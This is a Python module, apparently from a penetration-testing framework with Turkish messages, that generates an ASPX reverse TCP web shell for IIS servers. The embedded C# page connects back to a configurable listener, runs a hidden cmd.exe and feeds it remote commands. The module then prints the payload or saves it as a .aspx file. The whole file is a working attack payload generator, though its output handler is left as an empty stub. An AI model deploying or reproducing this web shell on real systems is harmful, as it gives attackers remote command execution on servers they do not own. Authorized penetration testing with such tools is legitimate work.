from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "windows/aspx_reverse_tcp"
    Description = "ASPX Reverse TCP Shell (IIS)."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: shell.aspx).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # C# ASPX Reverse Shell Stub
        payload = f"""
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {{
        String host = "{lhost}";
        int port = {lport};
        TcpClient client = new TcpClient(host, port);
        Stream stream = client.GetStream();
        StreamReader rdr = new StreamReader(stream);
        StreamWriter wtr = new StreamWriter(stream);
        StringBuilder strInput = new StringBuilder();
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
        p.Start();
        p.BeginOutputReadLine();
        while(true)
        {{
            strInput.Append(rdr.ReadLine());
            p.StandardInput.WriteLine(strInput);
            strInput.Remove(0, strInput.Length);
        }}
    }}
    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {{
        /* Output handler implementation skipped for brevity in simple shell */
    }}
</script>
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".aspx"):
                output_path += ".aspx"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] ASPX Payload oluşturuldu ({len(code)} bytes):")
                print(f"[*] Kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] ASPX Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
